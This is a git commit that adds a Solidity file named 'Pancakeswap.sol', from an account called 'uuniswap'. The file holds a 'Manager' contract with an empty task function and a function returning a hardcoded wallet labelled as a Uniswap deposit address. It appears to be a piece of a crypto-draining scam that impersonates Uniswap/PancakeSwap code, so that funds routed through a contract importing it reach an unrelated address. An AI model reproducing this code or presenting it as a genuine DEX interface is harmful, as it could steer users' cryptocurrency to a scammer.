444e8a601ad0d6043be852174f4e83060e8ab3c3
uuniswap <96855015+uuniswap@users.noreply.github.com>
2021-12-29 23:26:04 -0500

    Create Pancakeswap.sol

---
+++ uuniswap/contract/interface/v2/Pancakeswap.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x0519B306e10555c2eC0254f19ef4489Db67f48E0;
+	}
+}
